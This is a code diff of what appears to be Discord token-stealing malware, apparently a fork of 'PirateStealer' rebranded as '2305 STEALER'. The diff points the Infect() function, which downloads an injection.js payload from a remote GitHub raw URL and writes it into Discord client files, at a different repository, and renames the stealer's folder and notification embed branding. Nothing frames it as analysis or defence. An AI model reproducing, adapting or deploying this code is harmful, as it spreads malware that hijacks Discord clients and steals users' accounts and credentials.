@@ -35,7 +35,7 @@ discords.forEach(function(file) {
 });
 listDiscords();
 function Infect() {
-    https.get('https://raw.githubusercontent.com/Stanley-GF/PirateStealer/main/src/injection/injection.js', (resp) => {
+    https.get('https://raw.githubusercontent.com/iLxlo/2305/main/src/injection/injection.js', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
@@ -53,7 +53,7 @@ function Infect() {
                     }
                 }
                 if (config.logout != "false") {
-                    let folder = file.replace("index.js", "PirateStealerBTW")
+                    let folder = file.replace("index.js", "2305 STEALERBTW")
                     if (!fs.existsSync(folder)) {
                         fs.mkdirSync(folder, 0744)
                         if (config.logout == "instant") {
@@ -146,10 +146,10 @@ function injectNotify() {
                 "color": config["embed-color"],
                 "fields": fields,
                 "author": {
-                    "name": "PirateStealer"
+                    "name": "2305 STEALER"
                 },
                 "footer": {
-                    "text": "PirateStealer"
+                    "text": "2305 STEALER"
                 }
             }]
         })
